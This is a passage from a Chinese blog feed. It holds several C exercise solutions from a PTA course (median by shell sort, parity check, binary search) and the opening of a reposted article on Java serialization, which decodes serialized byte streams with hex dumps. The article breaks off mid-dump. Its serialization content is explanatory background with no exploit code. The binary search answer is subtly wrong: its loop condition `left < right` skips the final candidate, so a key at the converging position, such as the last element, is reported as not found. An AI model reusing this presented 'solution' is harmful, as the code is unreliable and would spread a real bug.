class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">float</span> ElementType;</span><br><span class="line"></span><br><span class="line"><span class="function">ElementType <span class="title">Median</span><span class="params">( ElementType A[], <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ElementType A[MAXN];</span><br><span class="line">    <span class="keyword">int</span> N, i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ )</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%f"</span>, &amp;A[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.2f\n"</span>, Median(A, N));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div><p>然后是输入输出样式：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">3</span><br><span class="line">12.3 34 -5</span><br><span class="line">输出</span><br><span class="line">12.30</span><br></pre></td></tr></table></figure></div><h3 id="解答-9"><a href="#解答-9" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ElementType <span class="title">Median</span><span class="params">( ElementType A[], <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    ElementType temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> gap=N/<span class="number">2</span>; gap&gt;<span class="number">0</span>; gap=gap/<span class="number">2</span>) &#123;</span><br><span class="line">    <span class="comment">//gap是每次排序分组的间隔，每次间隔缩小1/2</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=gap; i&lt;N; i++) &#123;</span><br><span class="line">    <span class="comment">//相当于在同一组内采用直接插入排序</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i-gap; j&gt;=<span class="number">0</span> &amp;&amp; A[j]&gt;A[j+gap]; j=j-gap) &#123;</span><br><span class="line">    <span class="comment">//如果同一组内前一个元素大于相隔gap个位置的元素，则两者交换位置 </span></span><br><span class="line">                temp = A[j];</span><br><span class="line">                A[j] = A[j+gap];</span><br><span class="line">                A[j+gap] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> A[N/<span class="number">2</span>]; <span class="comment">// 返回中间元素</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">input:</span></span><br><span class="line"><span class="comment">5</span></span><br><span class="line"><span class="comment">5 2 1 3 6</span></span><br><span class="line"><span class="comment">output:</span></span><br><span class="line"><span class="comment">i=2, gap=2, j=0</span></span><br><span class="line"><span class="comment">temp: 5.00</span></span><br><span class="line"><span class="comment">A[j]: 1.00</span></span><br><span class="line"><span class="comment">A[j+gap]: 5.00</span></span><br><span class="line"><span class="comment">i=3, gap=1, j=2</span></span><br><span class="line"><span class="comment">temp: 5.00</span></span><br><span class="line"><span class="comment">A[j]: 3.00</span></span><br><span class="line"><span class="comment">A[j+gap]: 5.00</span></span><br><span class="line"><span class="comment">3.00</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div><hr><h2 id="6-12-判断奇偶性-10分"><a href="#6-12-判断奇偶性-10分" class="headerlink" title="6-12 判断奇偶性 (10分)"></a>6-12 判断奇偶性 (10分)</h2><p>本题要求实现判断给定整数奇偶性的函数。<br>函数接口定义：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">even</span><span class="params">( <span class="keyword">int</span> n )</span></span>;</span><br></pre></td></tr></table></figure></div><p>其中 <code>n</code> 是用户传入的整型参数。当 <code>n为偶数</code> 时，函数返回1；<code>n为奇数</code> 时返回0。注意：0是偶数。</p><h3 id="裁判测试程序样例：-11"><a href="#裁判测试程序样例：-11" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">even</span><span class="params">( <span class="keyword">int</span> n )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">if</span> (even(n))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d is even.\n"</span>, n);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d is odd.\n"</span>, n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div><p>然后是输入输出样式：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">-6</span><br><span class="line">5</span><br><span class="line">输出</span><br><span class="line">-6 is even.</span><br><span class="line">5 is odd.</span><br></pre></td></tr></table></figure></div><h3 id="解答-10"><a href="#解答-10" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">even</span><span class="params">( <span class="keyword">int</span> n )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !(n%<span class="number">2</span>);</span><br><span class="line">    <span class="comment">/* N除2取余数，将余数值的非返回即成立</span></span><br><span class="line"><span class="comment">        3%2 = 1</span></span><br><span class="line"><span class="comment">        6%2 = 0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-13-折半查找-15分"><a href="#6-13-折半查找-15分" class="headerlink" title="6-13 折半查找 (15分)"></a>6-13 折半查找 (15分)</h2><p>给一个严格递增数列，函数 <code>int Search_Bin(SSTable T, KeyType k)</code> 用来二分地查找k在数列中的位置。<br>函数接口定义：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c++</div></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">Search_Bin</span><span class="params">(SSTable T, KeyType k)</span></span></span><br></pre></td></tr></table></figure></div><p>其中T是有序表，k是查找的值。</p><h3 id="裁判测试程序样例：-12"><a href="#裁判测试程序样例：-12" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c++</div></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 50</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> KeyType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>  <span class="class"><span class="keyword">struct</span>                     </span></span><br><span class="line"><span class="class">&#123;</span> KeyType  key;                                             </span><br><span class="line">&#125; ElemType;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>  <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span> ElemType  *R; </span><br><span class="line">  <span class="keyword">int</span>  length;</span><br><span class="line">&#125; SSTable;                      </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">Create</span><span class="params">(SSTable &amp;T)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">int</span> i;</span><br><span class="line">  T.R=<span class="keyword">new</span> ElemType[MAXSIZE+<span class="number">1</span>];</span><br><span class="line">  <span class="built_in">cin</span>&gt;&gt;T.length;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=T.length;i++)</span><br><span class="line">     <span class="built_in">cin</span>&gt;&gt;T.R[i].key;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">Search_Bin</span><span class="params">(SSTable T, KeyType k)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;  SSTable T;  KeyType k;</span><br><span class="line">   Create(T);</span><br><span class="line">   <span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">   <span class="keyword">int</span> pos=Search_Bin(T,k);</span><br><span class="line">   <span class="keyword">if</span>(pos==<span class="number">0</span>) <span class="built_in">cout</span>&lt;&lt;<span class="string">"NOT FOUND"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">   <span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;pos&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 请在这里填写答案 */</span></span><br></pre></td></tr></table></figure></div><p>然后是输入输出样式：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">第一行输入一个整数n，表示有序表的元素个数</span><br><span class="line">接下来一行n个数字，依次为表内元素值。</span><br><span class="line">然后输入一个要查找的值。</span><br><span class="line">5</span><br><span class="line">1 3 5 7 9</span><br><span class="line">7</span><br><span class="line"></span><br><span class="line">输出这个值在表内的位置</span><br><span class="line">如果没有找到，输出&quot;NOT FOUND&quot;。</span><br><span class="line">4</span><br></pre></td></tr></table></figure></div><h3 id="解答-11"><a href="#解答-11" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">Search_Bin</span><span class="params">(SSTable T, KeyType k)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> left = <span class="number">1</span>; <span class="comment">//左边起始点</span></span><br><span class="line">    <span class="keyword">int</span> right = T.length; <span class="comment">// 链表最后一位</span></span><br><span class="line">    <span class="keyword">int</span> mid;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(T.R[mid].key == k) &#123; <span class="comment">// 找到k, k为T.R[mid].key</span></span><br><span class="line">            <span class="keyword">return</span> mid;  <span class="comment">// 返回mid即k的位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(T.R[mid].key &gt; k) &#123; <span class="comment">// k在中间偏左</span></span><br><span class="line">            right = mid<span class="number">-1</span>; <span class="comment">// 使右边界收缩到 中间左一</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// k在中间偏右</span></span><br><span class="line">            left = mid+<span class="number">1</span>; <span class="comment">// 使左边界收缩到 中间右一</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//重复以上操作，直至左右边界相遇</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;算法原理要花时间好好摸一下，推荐一个大佬的数据结构算法详解&lt;br&gt;&lt;a href=&quot;https://github.com/labuladong/fucking-algorithm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;手把手撕LeetCode题目，扒各种算法套路的裤子&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="LeetCode" scheme="https://manayakko.github.io/yakko117/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>浅析Java序列化和反序列化 [转载]</title>
    <link href="https://manayakko.github.io/yakko117/2020/02/28/about-java-serialization-and-deserialization/"/>
    <id>https://manayakko.github.io/yakko117/2020/02/28/about-java-serialization-and-deserialization/</id>
    <published>2020-02-28T11:40:56.258Z</published>
    <updated>2020-03-03T04:05:47.185Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>github 上看到的，边看边学，边记笔记<br><a href="https://github.com/gyyyy" target="_blank" rel="noopener">感谢宫音师傅的文章</a></p><a id="more"></a><h1 id="浅析Java序列化和反序列化"><a href="#浅析Java序列化和反序列化" class="headerlink" title="浅析Java序列化和反序列化"></a>浅析Java序列化和反序列化</h1><p>别说你懂反序列化，也别再说你不懂反序列化。</p><h1 id="序列化机制"><a href="#序列化机制" class="headerlink" title="序列化机制"></a>序列化机制</h1><p>序列化 <code>Serialization</code> 是指将数据结构或对象状态转换成字节流，例如 <code>存储成文件、内存缓冲，或经由网络传输</code> ，以留待后续在相同或另一台计算机环境中，能够恢复对象原来状态的过程。序列化机制在Java中有着广泛的应用，<code>EJB、RMI、Hessian</code> 等技术都以此为基础。</p><hr><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>我们先用一个简单的序列化示例来看看Java究竟是如何对一个对象进行序列化的：</p><h2 id="简单序列化示例"><a href="#简单序列化示例" class="headerlink" title="简单序列化示例"></a>简单序列化示例</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationDemo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String stringField;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> intField;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SerializationDemo</span><span class="params">(String s, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.stringField = s;</span><br><span class="line">        <span class="keyword">this</span>.intField = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ByteArrayOutputStream bout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(bout);</span><br><span class="line">        out.writeObject(<span class="keyword">new</span> SerializationDemo(<span class="string">"gyyyy"</span>, <span class="number">97777</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>如果熟悉PHP的同学应该知道，这个对象在经过PHP序列化后得到的字符串如下 <font color="#0099ff">因为PHP与Java的编程习惯有所区别</font>，这里字段访问权限全改为了<code>public</code>，<code>private</code>和<code>protected</code>从表现形式上来说差不多，只是多了些特殊的标识而已，为了减少一些零基础的同学不必要的疑惑，这里暂不讨论：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:17:&quot;SerializationDemo&quot;:2:&#123;s:11:&quot;stringField&quot;;s:5:&quot;gyyyy&quot;;s:8:&quot;intField&quot;;i:97777;&#125;</span><br></pre></td></tr></table></figure></div><p>其中，<code>O:17:&quot;...&quot;</code> 表示当前是一个 <code>(Object)对象</code>，以及该对象类名的字符串长度和值，<code>2:{...}</code> 表示该类有2个字段 （元素间用 <code>;</code> 分隔，键值对也分为前后两个元素表示，也就是说，如果是2个字段，则总共会包含4个元素），<code>s:11:&quot;...&quot;</code> 表示当前是一个长度为11的字符串，<code>i:...</code> 表示当前是一个 <code>整数(integer)</code>。</p><p>由此可知，PHP序列化字符串基本上是可人读的，而且对于类对象来说，字段等成员属性的序列化顺序与定义顺序一致。我们完全可以通过手工的方式来构造任意一个PHP对象的序列化字符串。</p><hr><h3 id="Java序列化二进制字符串"><a href="#Java序列化二进制字符串" class="headerlink" title="Java序列化二进制字符串"></a>Java序列化二进制字符串</h3><p><font color="#0099ff">而该对象经过Java序列化后得到的则是一个二进制串：</font></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ac ed 00 05 73 72 00 11  53 65 72 69 61 6c 69 7a    ....sr.. Serializ</span><br><span class="line">61 74 69 6f 6e 44 65 6d  6f d9 35 3c f7 d6 0a c6    ationDem o.5&lt;....</span><br><span class="line">d5 02 00 02 49 00 08 69  6e 74 46 69 65 6c 64 4c    ....I..i ntFieldL</span><br><span class="line">00 0b 73 74 72 69 6e 67  46 69 65 6c 64 74 00 12    ..string Fieldt..</span><br><span class="line">4c 6a 61 76 61 2f 6c 61  6e 67 2f 53 74 72 69 6e    Ljava&#x2F;la ng&#x2F;Strin</span><br><span class="line">67 3b 78 70 00 01 7d f1  74 00 05 67 79 79 79 79    g;xp..&#125;. t..gyyyy</span><br></pre></td></tr></table></figure></div><p>仔细观察二进制串中的部分可读数据，我们也可以差不多分辨出该对象的一些基本内容。但同样为了手写的目的 <em>（为什么有这个目的？原因很简单，为了不被语言环境束缚）</em> ，以及为接下来的序列化执行流程分析做准备，我们先依次来解读一下这个二进制串中的各个元素。</p><ul><li><code>0xaced</code>，魔术头</li><li><code>0x0005</code>，版本号 （JDK主流版本一致，下文如无特殊标注，都以<font color="red">JDK8u</font>为例）</li><li><code>0x73</code>，对象类型标识 <em>（<code>0x7n</code>基本上都定义了类型标识符常量，但也要看出现的位置，毕竟它们都在可见字符的范围，详见<code>java.io.ObjectStreamConstants</code>）</em></li><li><code>0x72</code>，类描述符标识</li><li><code>0x0011...</code>，类名字符串长度和值 <em>（Java序列化中的UTF8格式标准）</em></li><li><code>0xd9353cf7d60ac6d5</code>，序列版本唯一标识 <em>（<code>serialVersionUID</code>，简称SUID）</em></li><li><code>0x02</code>，对象的序列化属性标志位，如是否是Block Data模式、自定义<code>writeObject()</code>，<code>Serializable</code>、<code>Externalizable</code>或<code>Enum</code>类型等</li><li><code>0x0002</code>，类的字段个数</li><li><code>0x49</code>，整数类型签名的第一个字节，同理，之后的<code>0x4c</code>为字符串类型签名的第一个字节 <font color="#0099ff">（类型签名表示与JVM规范中的定义相同）</font></li><li><code>0x0008...</code>，字段名字符串长度和值，非原始数据类型的字段还会在后面加上数据类型标识、完整类型签名长度和值，如之后的<code>0x740012...</code></li><li><code>0x78</code> Block Data结束标识</li><li><code>0x70</code> 父类描述符标识，此处为<code>null</code></li><li><code>0x00017df1</code> 整数字段<code>intField</code>的值 <em>（Java序列化中的整数格式标准）</em> ，非原始数据类型的字段则会按对象的方式处理，如之后的字符串字段<code>stringField</code>被识别为字符串类型，输出字符串类型标识、字符串长度和值</li></ul><p>由此可以看出，除了基本格式和一些整数表现形式上的不同之外，Java和PHP的序列化结果还是存在很多相似的地方，比如除了具体值外都会对类型进行描述。</p><p>需要注意的是，Java序列化中对字段进行封装时，会按原始和非原始数据类型排序 <em>（有同学可能想问为什么要这么做，这里我只能简单解释原因有两个，一是因为它们两个的表现形式不同，原始数据类型字段可以直接通过偏移量读取固定个数的字节来赋值；二是在封装时会计算原始类型字段的偏移量和总偏移量，以及非原始类型字段的个数，这使得反序列化阶段可以很方便的把原始和非原始数据类型分成两部分来处理）</em> ，且其中又会按字段名排序。</p><p>而开头固定的<code>0xaced0005</code>也可以作为Java序列化二进制串 <em>（Base64编码为<code>rO0AB...</code>）</em> 的识别标识。</p><hr><h3 id="让我们把这个对象再改复杂些："><a href="#让我们把这个对象再改复杂些：" class="headerlink" title="让我们把这个对象再改复杂些："></a>让我们把这个对象再改复杂些：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SerializationSuperClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String superField;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SerializationComponentClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String componentField;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationDemo</span> <span class="keyword">extends</span> <span class="title">SerializationSuperClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> SerializationComponentClass component;</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>它序列化后的二进制串大家可以自行消化理解一下，注意其中的嵌套对象，以及<code>0x71</code>表示的<code>Reference</code>类型标识 <em>（形式上与JVM的常量池类似，用于非原始数据类型的引用对象池索引，这个引用对象池在序列化和反序列化创建时的元素填充顺序会保持一致）</em> ：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ac ed 00 05 73 72 00 11  53 65 72 69 61 6c 69 7a    ....sr.. Serializ</span><br><span class="line">61 74 69 6f 6e 44 65 6d  6f 1a 7f cd d3 53 6f 6b    ationDem o....Sok</span><br><span class="line">15 02 00 03 49 00 08 69  6e 74 46 69 65 6c 64 4c    ....I..i ntFieldL</span><br><span class="line">00 09 63 6f 6d 70 6f 6e  65 6e 74 74 00 1d 4c 53    ..compon entt..LS</span><br><span class="line">65 72 69 61 6c 69 7a 61  74 69 6f 6e 43 6f 6d 70    erializa tionComp</span><br><span class="line">6f 6e 65 6e 74 43 6c 61  73 73 3b 4c 00 0b 73 74    onentCla ss;L..st</span><br><span class="line">72 69 6e 67 46 69 65 6c  64 74 00 12 4c 6a 61 76    ringFiel dt..Ljav</span><br><span class="line">61 2f 6c 61 6e 67 2f 53  74 72 69 6e 67 3b 78 72    a&#x2F;lang&#x2F;S tring;xr</span><br><span class="line">00 17 53 65 72 69 61 6c  69 7a 61 74 69 6f 6e 53    ..Serial izationS</span><br><span class="line">75 70 65 72 43 6c 61 73  73 de c6 50 b7 d1 2f a3    uperClas s..P..&#x2F;.</span><br><span class="line">27 02 00 01 4c 00 0a 73  75 70 65 72 46 69 65 6c    &#39;...L..s uperFiel</span><br><span class="line">64 71 00 7e 00 02 78 70  70 00 01 7d f1 73 72 00    dq.~..xp 